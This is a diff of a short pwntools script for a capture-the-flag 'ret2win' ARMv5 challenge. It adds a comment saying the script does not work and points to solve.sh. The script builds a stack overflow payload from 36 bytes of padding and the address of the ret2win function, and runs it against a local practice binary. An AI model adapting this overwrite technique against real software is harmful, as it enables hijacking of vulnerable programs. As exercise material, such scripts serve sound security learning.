@@ -1,5 +1,10 @@
 from pwn import *
 
+################################################################
+#####         DOESN'T WORK (weird), CHECK solve.sh         #####
+##### (which is just the one-liner version of this script) #####
+################################################################
+
 BINARY = "./ret2win_armv5"
 ELF = ELF(BINARY)
 
@@ -9,7 +14,7 @@ context.binary = BINARY
 
 p = process(BINARY)
 
-rop = b"A"*36
+rop = b"A" * 36
 #rop += p64(0x0001050c) # pop {r4, pc}
 rop += p32(ELF.symbols["ret2win"])
 
